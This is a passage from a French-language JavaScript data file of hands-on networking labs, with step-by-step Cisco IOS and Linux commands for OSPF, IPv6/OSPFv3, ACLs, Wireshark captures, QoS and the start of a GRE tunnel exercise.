      { type: "reseau", nom: "OSPF mono-zone maîtrisé (TP id:5 recommandé)" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Topologie multi-zone",
        contexte: "R1 et R2 dans Area 0 (backbone). R2 est ABR : un pied en Area 0 et un pied en Area 1. R3 et R4 dans Area 1.",
        commandes: [
          { os: "linux", cmd: "# Adressage :\n# Area 0 : R1(10.0.12.1/30) <-> R2(10.0.12.2/30)\n# Area 1 : R2(10.0.23.1/30) <-> R3(10.0.23.2/30) <-> R4(10.0.34.2/30)\n# Loopbacks : R1=1.1.1.1/32, R2=2.2.2.2/32, R3=3.3.3.3/32, R4=4.4.4.4/32", commentaire: "Plan d'adressage de la topologie multi-zone" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 2 — Configurer OSPF multi-zone",
        contexte: "Chaque interface est placée dans la zone appropriée. R2 a des interfaces dans les deux zones — c'est l'ABR.",
        commandes: [
          { os: "linux", cmd: "# R1 (Area 0 uniquement) :\nR1(config)# router ospf 1\nR1(config-router)# router-id 1.1.1.1\nR1(config-router)# network 10.0.12.0 0.0.0.3 area 0\nR1(config-router)# network 1.1.1.1 0.0.0.0 area 0", commentaire: "R1 tout en Area 0" },
          { os: "linux", cmd: "# R2 (ABR : Area 0 + Area 1) :\nR2(config)# router ospf 1\nR2(config-router)# router-id 2.2.2.2\nR2(config-router)# network 10.0.12.0 0.0.0.3 area 0\nR2(config-router)# network 10.0.23.0 0.0.0.3 area 1\nR2(config-router)# network 2.2.2.2 0.0.0.0 area 0", commentaire: "R2 ABR : lien vers R1 en Area 0, lien vers R3 en Area 1" },
          { os: "linux", cmd: "# R3 et R4 (Area 1 uniquement) :\nR3(config)# router ospf 1\nR3(config-router)# router-id 3.3.3.3\nR3(config-router)# network 10.0.23.0 0.0.0.3 area 1\nR3(config-router)# network 10.0.34.0 0.0.0.3 area 1\nR3(config-router)# network 3.3.3.3 0.0.0.0 area 1", commentaire: "R3 tout en Area 1" }
        ],
        erreurs_courantes: [
          { symptome: "Adjacence OSPF non établie entre R1 et R2", cause: "Numéro de process OSPF différent ou area mismatch", solution: "Le process ID (ospf 1) est local et peut différer. Vérifier que les réseaux annoncés avec network correspondent aux bonnes interfaces et zones." }
        ]
      },
      {
        titre: "Étape 3 — Analyser les routes et les LSA",
        contexte: "On vérifie les tables de routage : les routes O sont intra-zone, les routes O IA sont inter-zones (générées par l'ABR).",
        commandes: [
          { os: "linux", cmd: "R1# show ip route ospf", commentaire: "R1 voit O (Area 0) et O IA (routes d'Area 1 résumées par R2)" },
          { os: "linux", cmd: "R1# show ip ospf database", commentaire: "Base de données LSDB : LSA type 1 (Router), type 2 (Network), type 3 (Summary)" },
          { os: "linux", cmd: "R1# show ip ospf database summary", commentaire: "LSA type 3 générés par l'ABR R2 — routes inter-zones" },
          { os: "linux", cmd: "R2# show ip ospf border-routers", commentaire: "Confirmer que R2 est bien identifié comme ABR" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — Résumé inter-zone sur l'ABR",
        contexte: "On configure le résumé des routes d'Area 1 sur l'ABR R2 pour n'annoncer qu'un seul préfixe vers Area 0.",
        commandes: [
          { os: "linux", cmd: "# Sur R2 (ABR) :\nR2(config)# router ospf 1\nR2(config-router)# area 1 range 10.0.0.0 255.255.0.0", commentaire: "Résumer toutes les routes 10.0.x.x d'Area 1 en un seul préfixe /16 vers Area 0" },
          { os: "linux", cmd: "R1# show ip route ospf | grep 10.0.0.0", commentaire: "R1 ne doit voir qu'une route résumée 10.0.0.0/16 au lieu des routes individuelles" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "show ip ospf neighbor : adjacences établies sur R1, R2, R3, R4",
      "show ip ospf database : LSA type 1, 2, 3 présents",
      "R1 show ip route ospf : routes O et O IA visibles",
      "R2 show ip ospf border-routers : R2 identifié ABR",
      "Résumé area 1 range : R1 voit 10.0.0.0/16 au lieu des routes individuelles"
    ],
    tags: ["ospf", "multi-zone", "abr", "lsa", "cisco", "gns3", "routage", "area"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 78,
    titre: "IPv6 — adressage, routage statique et OSPFv3",
    categorie: "reseau",
    niveau: "intermédiaire",
    duree: 90,
    description: "Configurer IPv6 sur des routeurs Cisco : adressage global unicast et link-local, routage statique IPv6, découverte de voisins NDP et protocole de routage OSPFv3. Comparaison avec IPv4 et coexistence dual-stack.",
    objectifs: [
      "Comprendre la structure des adresses IPv6 (GUA, LLA, ULA)",
      "Configurer des adresses IPv6 sur les interfaces Cisco",
      "Mettre en place le routage statique IPv6",
      "Analyser NDP (Neighbor Discovery Protocol)",
      "Configurer OSPFv3 pour IPv6"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+ avec GNS3 VM (VMware ou VirtualBox)", lien: "https://gns3.com" },
      { type: "vm", nom: "2x Cisco IOSv 15.x (vérifier que l'image supporte ipv6 unicast-routing)" },
      { type: "reseau", nom: "Adressage IPv6 : lien R1-R2 = 2001:db8:12::/64, LAN R1 = 2001:db8:1::/64, LAN R2 = 2001:db8:2::/64" },
      { type: "reseau", nom: "Notions de base IPv4 maîtrisées — IPv6 est complémentaire, pas un remplacement dans ce TP" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Activer IPv6 et configurer les adresses",
        contexte: "IPv6 doit être activé globalement sur le routeur Cisco avec ipv6 unicast-routing. Les adresses link-local sont générées automatiquement, les adresses globales sont configurées manuellement ou via SLAAC.",
        commandes: [
          { os: "linux", cmd: "# Activer le routage IPv6 :\nR1(config)# ipv6 unicast-routing", commentaire: "Indispensable pour que le routeur route les paquets IPv6" },
          { os: "linux", cmd: "# Configurer une adresse IPv6 globale :\nR1(config)# interface GigabitEthernet0/0\nR1(config-if)# ipv6 address 2001:db8:1::1/64\nR1(config-if)# ipv6 address FE80::1 link-local\nR1(config-if)# no shutdown", commentaire: "Adresse GUA (2001:db8:1::1) + LLA manuelle (FE80::1)" },
          { os: "linux", cmd: "R1# show ipv6 interface GigabitEthernet0/0", commentaire: "Vérifier les adresses IPv6 configurées sur l'interface" },
          { os: "linux", cmd: "R1# show ipv6 interface brief", commentaire: "Vue synthétique de toutes les interfaces IPv6" }
        ],
        erreurs_courantes: [
          { symptome: "Commande ipv6 address non reconnue", cause: "ipv6 unicast-routing non activé ou image IOS sans support IPv6", solution: "Activer ipv6 unicast-routing en global config. Vérifier avec show version que l'image supporte IPv6." }
        ]
      },
      {
        titre: "Étape 2 — Routage statique IPv6",
        contexte: "On configure des routes statiques IPv6 entre deux routeurs. La syntaxe est similaire à IPv4 mais avec les adresses IPv6.",
        commandes: [
          { os: "linux", cmd: "# R1 vers le réseau de R2 :\nR1(config)# ipv6 route 2001:db8:2::/64 2001:db8:12::2", commentaire: "Route statique IPv6 : réseau 2001:db8:2::/64 via next-hop R2" },
          { os: "linux", cmd: "# Route statique via link-local (recommandé sur les liens point-à-point) :\nR1(config)# ipv6 route 2001:db8:2::/64 GigabitEthernet0/0 FE80::2", commentaire: "Via adresse link-local — nécessite de spécifier l'interface de sortie" },
          { os: "linux", cmd: "R1# show ipv6 route", commentaire: "Table de routage IPv6 — S = statique, C = connected, L = local" },
          { os: "linux", cmd: "R1# ping 2001:db8:2::1", commentaire: "Tester la connectivité IPv6 vers R2" }
        ],
        erreurs_courantes: [
          { symptome: "Route via LLA refusée sans interface", cause: "Les adresses link-local sont ambiguës sans interface de sortie", solution: "Toujours spécifier l'interface de sortie avec les LLA : ipv6 route ... GigabitEthernet0/0 FE80::2" }
        ]
      },
      {
        titre: "Étape 3 — NDP (Neighbor Discovery Protocol)",
        contexte: "NDP remplace ARP en IPv6. Il utilise ICMPv6 pour la découverte de voisins, la détection d'adresses dupliquées et l'annonce de routeurs.",
        commandes: [
          { os: "linux", cmd: "R1# show ipv6 neighbors", commentaire: "Table NDP — équivalent de show ip arp en IPv4" },
          { os: "linux", cmd: "R1# show ipv6 routers", commentaire: "Routeurs annoncés par RA (Router Advertisement) sur le segment" },
          { os: "linux", cmd: "# Configurer les annonces RA sur une interface :\nR1(config)# interface GigabitEthernet0/0\nR1(config-if)# ipv6 nd ra interval 30", commentaire: "Envoyer des Router Advertisements toutes les 30 secondes" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — OSPFv3 pour IPv6",
        contexte: "OSPFv3 est la version d'OSPF pour IPv6. La configuration se fait sur les interfaces (non sur les réseaux) et le process utilise des router-id en format IPv4.",
        commandes: [
          { os: "linux", cmd: "# Activer OSPFv3 sur R1 :\nR1(config)# ipv6 router ospf 1\nR1(config-rtr)# router-id 1.1.1.1", commentaire: "Process OSPFv3 avec router-id en format IPv4 (obligatoire)" },
          { os: "linux", cmd: "# Activer OSPFv3 sur chaque interface :\nR1(config)# interface GigabitEthernet0/0\nR1(config-if)# ipv6 ospf 1 area 0\nR1(config)# interface Loopback0\nR1(config-if)# ipv6 ospf 1 area 0", commentaire: "OSPFv3 se configure sur l'interface, pas avec network" },
          { os: "linux", cmd: "R1# show ipv6 ospf neighbor", commentaire: "Vérifier les adjacences OSPFv3" },
          { os: "linux", cmd: "R1# show ipv6 route ospf", commentaire: "Routes apprises par OSPFv3 — marquées O en IPv6" }
        ],
        erreurs_courantes: [
          { symptome: "OSPFv3 adjacence non établie malgré la connectivité IPv6", cause: "Router-id non configuré alors qu'aucune interface IPv4 n'existe", solution: "Configurer explicitement le router-id : ipv6 router ospf 1 > router-id X.X.X.X" }
        ]
      }
    ],
    checklist: [
      "ipv6 unicast-routing activé sur tous les routeurs",
      "show ipv6 interface brief : adresses GUA et LLA configurées",
      "ping IPv6 entre routeurs : OK",
      "show ipv6 route : routes statiques S visibles",
      "show ipv6 neighbors : table NDP peuplée",
      "show ipv6 ospf neighbor : adjacences OSPFv3 établies",
      "show ipv6 route ospf : routes O IPv6 apprises"
    ],
    tags: ["ipv6", "ospfv3", "ndp", "cisco", "gns3", "adressage", "routage", "reseau"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 79,
    titre: "ACL avancées — access-list étendue, named ACL et log",
    categorie: "reseau",
    niveau: "intermédiaire",
    duree: 75,
    description: "Maîtriser les Access Control Lists étendues sur Cisco IOS : filtrage par protocole, adresse source/destination et port, ACL nommées, placement optimal (proche de la source ou destination), journalisation des correspondances et dépannage.",
    objectifs: [
      "Créer des ACL étendues numérotées et nommées",
      "Filtrer par protocole (TCP, UDP, ICMP) et port",
      "Placer correctement les ACL (in/out, proche source ou destination)",
      "Utiliser le mot-clé log pour journaliser",
      "Débugger avec show ip access-lists et debug ip packet"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+ avec GNS3 VM (VMware ou VirtualBox)", lien: "https://gns3.com" },
      { type: "vm", nom: "2x Cisco IOSv 15.x (R1 routeur filtrant, R2 routeur destination)" },
      { type: "vm", nom: "2x VPCS ou VMs Linux (PC1 = 192.168.1.10/24 côté LAN, PC2 = 192.168.2.10/24 côté DMZ)" },
      { type: "reseau", nom: "Topologie : PC1 -- R1 (G0/0=192.168.1.1, G0/1=10.0.0.1) -- R2 (G0/0=10.0.0.2, G0/1=192.168.2.1) -- PC2" },
      { type: "reseau", nom: "Routage statique entre R1 et R2 configuré avant de commencer les ACL" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — ACL étendue numérotée",
        contexte: "Les ACL étendues (100-199, 2000-2699) filtrent sur le protocole, l'IP source, l'IP destination et les ports. L'ordre des règles est crucial — la première correspondance gagne.",
        commandes: [
          { os: "linux", cmd: "# Autoriser HTTP/HTTPS depuis 192.168.1.0/24 vers n'importe quelle destination :\nR1(config)# access-list 101 permit tcp 192.168.1.0 0.0.0.255 any eq 80\nR1(config)# access-list 101 permit tcp 192.168.1.0 0.0.0.255 any eq 443\nR1(config)# access-list 101 deny tcp 192.168.1.0 0.0.0.255 any\nR1(config)# access-list 101 permit ip any any", commentaire: "ACL 101 : autoriser web, bloquer autre TCP, autoriser le reste" },
          { os: "linux", cmd: "# Appliquer l'ACL sur une interface :\nR1(config)# interface GigabitEthernet0/0\nR1(config-if)# ip access-group 101 in", commentaire: "ACL appliquée en entrée sur l'interface LAN (proche de la source)" }
        ],
        erreurs_courantes: [
          { symptome: "Tout le trafic est bloqué après application de l'ACL", cause: "Le deny ip any any implicite à la fin bloque tout ce qui n'est pas explicitement permis", solution: "Toujours ajouter permit ip any any à la fin si vous voulez autoriser le reste. Vérifier avec show ip access-lists les compteurs de correspondances." }
        ]
      },
      {
        titre: "Étape 2 — ACL nommée",
        contexte: "Les ACL nommées sont plus lisibles et permettent de supprimer/ajouter des règles individuelles sans recréer toute l'ACL.",
        commandes: [
          { os: "linux", cmd: "# Créer une ACL nommée étendue :\nR1(config)# ip access-list extended FILTRAGE-LAN\nR1(config-ext-nacl)# 10 permit tcp 192.168.1.0 0.0.0.255 any eq 22\nR1(config-ext-nacl)# 20 permit tcp 192.168.1.0 0.0.0.255 any eq 80\nR1(config-ext-nacl)# 30 permit tcp 192.168.1.0 0.0.0.255 any eq 443\nR1(config-ext-nacl)# 40 permit icmp 192.168.1.0 0.0.0.255 any\nR1(config-ext-nacl)# 50 deny ip any any log", commentaire: "ACL nommée avec numéros de séquence et log sur le deny final" },
          { os: "linux", cmd: "# Supprimer une règle spécifique :\nR1(config)# ip access-list extended FILTRAGE-LAN\nR1(config-ext-nacl)# no 20", commentaire: "Supprimer la règle 20 (HTTP) sans toucher aux autres" },
          { os: "linux", cmd: "# Insérer une règle entre deux existantes :\nR1(config-ext-nacl)# 15 permit tcp 192.168.1.0 0.0.0.255 any eq 21", commentaire: "Insérer une règle FTP entre les règles 10 et 20" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 3 — Journalisation et dépannage",
        contexte: "Le mot-clé log génère un message syslog pour chaque paquet correspondant à la règle. Utile pour le débogage mais gourmand en ressources — à utiliser avec modération en production.",
        commandes: [
          { os: "linux", cmd: "R1# show ip access-lists FILTRAGE-LAN", commentaire: "Afficher les règles avec les compteurs de correspondances (matches)" },
          { os: "linux", cmd: "R1# show ip interface GigabitEthernet0/0 | include access list", commentaire: "Vérifier quelle ACL est appliquée et dans quel sens (in/out)" },
          { os: "linux", cmd: "R1# clear ip access-list counters FILTRAGE-LAN", commentaire: "Remettre à zéro les compteurs pour un nouveau test" },
          { os: "linux", cmd: "R1# debug ip packet 101 detail", commentaire: "Debug détaillé des paquets matchant l'ACL 101 — ATTENTION : très verbeux en production" }
        ],
        erreurs_courantes: [
          { symptome: "L'ACL bloque le trafic de retour (sessions TCP établies bloquées)", cause: "ACL stateless — elle ne fait pas de suivi de session par défaut", solution: "Utiliser le mot-clé established pour autoriser le trafic de retour TCP : permit tcp any 192.168.1.0 0.0.0.255 established" }
        ]
      },
      {
        titre: "Étape 4 — Placement optimal des ACL",
        contexte: "Règle d'or : ACL standard proche de la DESTINATION, ACL étendue proche de la SOURCE. Mauvais placement = trafic légitime bloqué ou ressources gaspillées.",
        commandes: [
          { os: "linux", cmd: "# Bonne pratique : ACL étendue en entrée sur l'interface source\n# Le trafic interdit est bloqué dès l'entrée sans traverser le réseau\nR1(config)# interface GigabitEthernet0/0\nR1(config-if)# ip access-group FILTRAGE-LAN in", commentaire: "ACL étendue en IN sur l'interface qui reçoit le trafic du LAN" },
          { os: "linux", cmd: "# ACL standard en sortie proche de la destination :\nR1(config)# access-list 10 permit 192.168.1.0 0.0.0.255\nR1(config)# interface GigabitEthernet0/1\nR1(config-if)# ip access-group 10 out", commentaire: "ACL standard en OUT sur l'interface vers la destination" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "ACL 101 créée avec règles permit TCP 80/443 et deny TCP",
      "show ip access-lists : compteurs s'incrémentent lors des tests",
      "ACL nommée FILTRAGE-LAN créée avec numéros de séquence",
      "Suppression et insertion de règle individuelles fonctionnelles",
      "Mot-clé log génère des messages dans les logs",
      "show ip interface confirme l'ACL appliquée sur la bonne interface"
    ],
    tags: ["acl", "access-list", "cisco", "filtrage", "securite", "gns3", "reseau", "log"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 80,
    titre: "Wireshark — capture et analyse de trames réseau",
    categorie: "reseau",
    niveau: "débutant",
    duree: 60,
    description: "Maîtriser Wireshark pour capturer et analyser le trafic réseau : filtres d'affichage et de capture, analyse des protocoles ARP, DHCP, DNS, TCP/TLS et HTTP. Identification de problèmes réseau depuis les captures.",
    objectifs: [
      "Capturer du trafic sur une interface réseau",
      "Utiliser les filtres d'affichage Wireshark",
      "Analyser une session TCP (3-way handshake)",
      "Décoder des échanges DHCP, DNS et HTTP",
      "Exporter et partager des captures pcap"
    ],
    prerequis: [
      { type: "logiciel", nom: "Wireshark 4.x installé sur la machine hôte ou une VM", lien: "https://www.wireshark.org/download.html" },
      { type: "vm", nom: "VM Debian 12 ou Ubuntu 22.04 avec nginx installé (pour générer du trafic HTTP)" },
      { type: "reseau", nom: "La machine doit avoir un accès Internet (pour tester DNS, HTTP vers example.com)" },
      { type: "logiciel", nom: "tshark installé optionnel : sudo apt install tshark (pour captures CLI)" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Interface et capture de base",
        contexte: "Wireshark liste toutes les interfaces réseau disponibles. On sélectionne celle à écouter et on lance la capture. Les paquets apparaissent en temps réel.",
        commandes: [
          { os: "linux", cmd: "sudo apt install wireshark -y\n# Ajouter l'utilisateur au groupe wireshark pour capturer sans root :\nsudo usermod -aG wireshark $USER", commentaire: "Installer Wireshark sur Debian/Ubuntu" },
          { os: "linux", cmd: "# Depuis le terminal (mode CLI) :\nsudo tshark -i eth0 -c 100 -w /tmp/capture.pcap", commentaire: "Capturer 100 paquets sur eth0 et les sauvegarder en pcap" },
          { os: "both", cmd: "# Interface graphique Wireshark :\n# 1. Sélectionner l'interface (eth0, Wi-Fi...)\n# 2. Cliquer sur la requin bleue (Start)\n# 3. Générer du trafic (ping, curl...)\n# 4. Cliquer sur le carré rouge (Stop)", commentaire: "Workflow de base Wireshark GUI" }
        ],
        erreurs_courantes: [
          { symptome: "Aucune interface disponible dans Wireshark", cause: "Wireshark non autorisé à capturer sans root", solution: "sudo usermod -aG wireshark $USER puis se déconnecter/reconnecter. Ou lancer Wireshark avec sudo (non recommandé)." }
        ]
      },
      {
        titre: "Étape 2 — Filtres d'affichage essentiels",
        contexte: "Les filtres d'affichage (display filters) filtrent les paquets déjà capturés sans les supprimer. Ils utilisent une syntaxe propre à Wireshark, différente des filtres de capture.",
        commandes: [
          { os: "both", cmd: "# Filtres d'affichage courants :\n# ip.addr == 192.168.1.10          -> trafic de/vers cette IP\n# ip.src == 192.168.1.10           -> trafic depuis cette IP\n# tcp.port == 443                   -> trafic HTTPS\n# http                              -> tout le trafic HTTP\n# dns                               -> requêtes/réponses DNS\n# arp                               -> trafic ARP\n# tcp.flags.syn == 1                -> paquets SYN TCP\n# !arp && !icmp                     -> exclure ARP et ICMP", commentaire: "Filtres d'affichage Wireshark les plus utilisés" },
          { os: "both", cmd: "# Filtres de capture (avant la capture) :\n# host 192.168.1.10\n# port 80 or port 443\n# not arp", commentaire: "Filtres BPF pour réduire le volume capturé" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 3 — Analyser un 3-way handshake TCP",
        contexte: "On capture une connexion TCP et on observe les trois étapes du handshake : SYN, SYN-ACK, ACK. Puis on suit le flux complet.",
        commandes: [
          { os: "linux", cmd: "# Générer une connexion HTTP :\ncurl http://example.com -o /dev/null\n# Filtre Wireshark : tcp && ip.addr == 93.184.216.34", commentaire: "Capturer une connexion vers example.com" },
          { os: "both", cmd: "# Dans Wireshark :\n# 1. Filtrer : tcp.flags.syn == 1\n# 2. Identifier : SYN (client->serveur), SYN-ACK (serveur->client), ACK\n# 3. Clic droit sur un paquet > Follow > TCP Stream\n# 4. Observer l'échange HTTP complet en clair", commentaire: "Analyser le handshake et suivre le flux TCP" },
          { os: "both", cmd: "# Statistiques TCP :\n# Statistics > TCP Stream Graphs > Time Sequence (tcptrace)\n# Statistics > Conversations -> voir les flux par IP/port", commentaire: "Utiliser les statistiques Wireshark pour analyser les flux" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — Analyser DHCP, DNS et ARP",
        contexte: "On capture les échanges DHCP (DORA), DNS et ARP pour comprendre les mécanismes de base du réseau.",
        commandes: [
          { os: "linux", cmd: "# Renouveler le bail DHCP pour générer du trafic :\nsudo dhclient -r eth0 && sudo dhclient eth0\n# Filtre Wireshark : bootp", commentaire: "Capturer les 4 messages DORA : Discover, Offer, Request, Ack" },
          { os: "linux", cmd: "# Générer des requêtes DNS :\nnslookup google.com\n# Filtre Wireshark : dns", commentaire: "Capturer les requêtes DNS et analyser les réponses (A, AAAA, CNAME)" },
          { os: "linux", cmd: "# Analyser ARP :\nping 192.168.1.1\n# Filtre Wireshark : arp\n# Observer : ARP Request (who has) et ARP Reply (is at)", commentaire: "Capturer les échanges ARP pour la résolution MAC/IP" },
          { os: "both", cmd: "# Exporter la capture :\n# File > Export Specified Packets > Format pcapng\n# Partager le fichier .pcapng pour analyse collaborative", commentaire: "Sauvegarder et partager une capture pcap" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "Wireshark lancé et capture active sur l'interface réseau",
      "Filtre ip.addr == X.X.X.X fonctionne et isole le trafic",
      "3-way handshake TCP : SYN, SYN-ACK, ACK identifiés",
      "Follow TCP Stream affiche l'échange HTTP en clair",
      "Messages DHCP DORA capturés et identifiés (bootp)",
      "Requêtes et réponses DNS capturées",
      "Capture exportée en fichier .pcapng"
    ],
    tags: ["wireshark", "capture", "analyse", "tcp", "dhcp", "dns", "arp", "pcap", "reseau"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 81,
    titre: "QoS Cisco — classification, marquage et mise en file d'attente",
    categorie: "reseau",
    niveau: "avancé",
    duree: 90,
    description: "Configurer la Qualité de Service (QoS) sur des routeurs Cisco avec le modèle MQC (Modular QoS CLI) : classification du trafic avec class-map, marquage DSCP, mise en file d'attente CBWFQ et limitation de bande passante avec police.",
    objectifs: [
      "Comprendre les modèles QoS IntServ et DiffServ",
      "Classifier le trafic avec class-map",
      "Appliquer une policy-map avec marking et queuing",
      "Configurer CBWFQ pour garantir la bande passante",
      "Limiter le débit avec le mécanisme police"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+ avec GNS3 VM (VMware ou VirtualBox)", lien: "https://gns3.com" },
      { type: "vm", nom: "2x Cisco IOSv 15.x (R1 routeur WAN avec QoS, R2 routeur destination)" },
      { type: "vm", nom: "2x VPCS ou VMs Linux pour générer du trafic de test" },
      { type: "reseau", nom: "Topologie : PC_LAN -- R1 (G0/0=192.168.1.1/24, G0/1=10.0.0.1/30) -- R2 (10.0.0.2/30) -- Serveur" },
      { type: "reseau", nom: "ACL étendues maîtrisées (TP id:79 recommandé avant ce TP)" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Classification avec class-map",
        contexte: "La première étape QoS est d'identifier le trafic. Les class-map utilisent des critères comme le protocole, les ACL, le DSCP ou le port pour classifier les flux.",
        commandes: [
          { os: "linux", cmd: "# Classifier le trafic voix (RTP sur UDP 16384-32767) :\nR1(config)# class-map match-all VOIX\nR1(config-cmap)# match protocol rtp\nR1(config-cmap)# match ip dscp ef", commentaire: "Class-map VOIX : RTP avec DSCP EF (Expedited Forwarding)" },
          { os: "linux", cmd: "# Classifier le trafic de gestion :\nR1(config)# class-map match-any GESTION\nR1(config-cmap)# match protocol ssh\nR1(config-cmap)# match protocol snmp", commentaire: "Class-map GESTION : SSH et SNMP (match-any = OR)" },
          { os: "linux", cmd: "# Classifier via ACL :\nR1(config)# access-list 110 permit tcp any any eq 443\nR1(config)# class-map match-all HTTPS\nR1(config-cmap)# match access-group 110", commentaire: "Class-map HTTPS basée sur une ACL" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 2 — Policy-map avec marquage et garantie de bande passante",
        contexte: "La policy-map associe des actions aux classes définies. On peut marquer le DSCP, garantir de la bande passante (bandwidth) ou prioriser (priority pour la voix).",
        commandes: [
          { os: "linux", cmd: "# Créer la policy-map :\nR1(config)# policy-map QOS-WAN\nR1(config-pmap)# class VOIX\nR1(config-pmap-c)# priority 512\nR1(config-pmap-c)# set ip dscp ef", commentaire: "Classe VOIX : priority queue 512 Kbps + marquage DSCP EF" },
          { os: "linux", cmd: "R1(config-pmap)# class GESTION\nR1(config-pmap-c)# bandwidth 128\nR1(config-pmap-c)# set ip dscp cs2", commentaire: "Classe GESTION : bande passante garantie 128 Kbps + DSCP CS2" },
          { os: "linux", cmd: "R1(config-pmap)# class HTTPS\nR1(config-pmap-c)# bandwidth percent 30\nR1(config-pmap-c)# set ip dscp af31", commentaire: "Classe HTTPS : 30% de la bande passante + DSCP AF31" },
          { os: "linux", cmd: "R1(config-pmap)# class class-default\nR1(config-pmap-c)# fair-queue\nR1(config-pmap-c)# set ip dscp default", commentaire: "Trafic restant : WFQ équitable + DSCP 0" }
        ],
        erreurs_courantes: [
          { symptome: "Erreur : sum of bandwidths exceed available bandwidth", cause: "La somme des bandes passantes garanties dépasse 75% de l'interface", solution: "Réduire les valeurs bandwidth. Cisco réserve 25% par défaut pour le trafic de contrôle. La somme doit rester sous 75% de la capacité." }
        ]
      },
      {
        titre: "Étape 3 — Appliquer la policy et policer le débit",
        contexte: "On applique la policy-map sur une interface en sortie (service-policy output) et on ajoute un police pour limiter le débit d'une classe.",
        commandes: [
          { os: "linux", cmd: "# Appliquer la policy sur l'interface WAN :\nR1(config)# interface GigabitEthernet0/1\nR1(config-if)# service-policy output QOS-WAN", commentaire: "Appliquer QoS en sortie sur le lien WAN" },
          { os: "linux", cmd: "# Ajouter un police pour limiter HTTP à 1 Mbps :\nR1(config)# policy-map QOS-WAN\nR1(config-pmap)# class HTTPS\nR1(config-pmap-c)# police rate 1000000 bps\nR1(config-pmap-c-police)# conform-action transmit\nR1(config-pmap-c-police)# exceed-action drop", commentaire: "Limiter HTTPS à 1 Mbps — conformes transmis, excédents droppés" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — Vérifier et monitorer",
        contexte: "On vérifie l'application de la QoS et on observe les statistiques de files d'attente.",
        commandes: [
          { os: "linux", cmd: "R1# show policy-map interface GigabitEthernet0/1", commentaire: "Statistiques QoS par classe : paquets transmis, droppés, DSCP utilisé" },
          { os: "linux", cmd: "R1# show class-map", commentaire: "Lister toutes les class-map et leurs critères" },
          { os: "linux", cmd: "R1# show policy-map", commentaire: "Lister toutes les policy-map et leurs classes" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "show class-map : VOIX, GESTION et HTTPS définies",
      "show policy-map : QOS-WAN avec les trois classes configurées",
      "service-policy output appliquée sur l'interface WAN",
      "show policy-map interface : statistiques non nulles après trafic",
      "Police HTTPS : paquets exceed droppés visibles dans les stats"
    ],
    tags: ["qos", "cisco", "mqc", "cbwfq", "dscp", "class-map", "policy-map", "reseau"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 82,
    titre: "GRE Tunnel — interconnexion de sites via Internet",
    categorie: "reseau",
    niveau: "intermédiaire",
    duree: 60,
    description: "Configurer un tunnel GRE (Generic Routing Encapsulation) entre deux routeurs Cisco pour interconnecter deux sites distants via Internet. Le tunnel GRE encapsule les paquets IP dans IP et permet de faire transiter n'importe quel protocole routable.",
    objectifs: [
      "Comprendre le fonctionnement de l'encapsulation GRE",
      "Créer une interface Tunnel entre deux routeurs",
      "Configurer le routage à travers le tunnel",
      "Mesurer le MTU et la fragmentation",
      "Sécuriser le tunnel GRE avec IPsec (optionnel)"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+ avec GNS3 VM (VMware ou VirtualBox)", lien: "https://gns3.com" },
      { type: "vm", nom: "2x Cisco IOSv 15.x (R1 = Site A, R2 = Site B)" },
      { type: "vm", nom: "1x routeur Cisco IOSv intermédiaire simulant Internet (optionnel — peut être remplacé par un lien direct)" },
      { type: "reseau", nom: "Adressage : WAN R1=10.0.0.1/30 <-> R2=10.0.0.2/30 | LAN A=192.168.1.0/24 | LAN B=192.168.2.0/24 | Tunnel=172.16.0.0/30" },
      { type: "reseau", nom: "Routage statique maîtrisé — la connectivité IP sous-jacente doit fonctionner AVANT de configurer le tunnel" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Topologie et prérequis",
        contexte: "R1 (site A) et R2 (site B) sont connectés via un réseau simulant Internet (10.0.0.0/30). Les LAN locaux sont 192.168.1.0/24 (site A) et 192.168.2.0/24 (site B). Le tunnel GRE utilisera 172.16.0.0/30.",
        commandes: [
          { os: "linux", cmd: "# R1 interfaces physiques :\nR1(config)# interface GigabitEthernet0/0\nR1(config-if)# ip address 10.0.0.1 255.255.255.252\nR1(config-if)# no shutdown\nR1(config)# interface GigabitEthernet0/1\nR1(config-if)# ip address 192.168.1.1 255.255.255.0\nR1(config-if)# no shutdown", commentaire: "R1 : interface WAN vers Internet + interface LAN site A" },
          { os: "linux", cmd: "# R2 interfaces physiques (même logique) :\n# WAN : 10.0.0.2/30, LAN : 192.168.2.1/24\n# Route par défaut vers Internet :\nR1(config)# ip route 0.0.0.0 0.0.0.0 10.0.0.2\nR2(config)# ip route 0.0.0.0 0.0.0.0 10.0.0.1", commentaire: "Routes par défaut pour la connectivité Internet (prérequis tunnel GRE)" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 2 — Créer les interfaces tunnel GRE",
        contexte: "L'interface Tunnel est une interface logique. Elle a une adresse IP tunnel (172.16.0.x) et des paramètres source/destination qui correspondent aux IPs publiques des routeurs.",
